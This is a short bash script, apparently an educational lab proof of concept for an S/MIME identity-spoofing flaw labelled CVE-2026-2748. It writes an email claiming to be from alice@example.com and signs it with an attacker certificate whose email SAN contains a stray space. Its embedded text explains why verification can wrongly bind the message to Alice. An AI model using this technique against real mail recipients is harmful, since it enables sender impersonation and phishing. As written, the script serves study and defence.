#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
OUT="$ROOT/demo_out"
MSG="$OUT/unsigned_message.eml"

mkdir -p "$OUT"

cat > "$MSG" <<'EOF'
From: alice@example.com
To: analyst@lab.local
Subject: CVE-2026-2748 educational PoC — signed as "Alice"

MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

This message is signed with a certificate whose rfc822Name SAN is not
literally alice@example.com — it contains a space (alice @example.com).
OpenSSL smime -verify still passes; a naive identity binding can wrongly
treat this as Alice.
EOF

openssl smime -sign -in "$MSG" \
  -signer "$OUT/attacker.crt" -inkey "$OUT/attacker.key" \
  -out "$OUT/signed_spoof.pem"
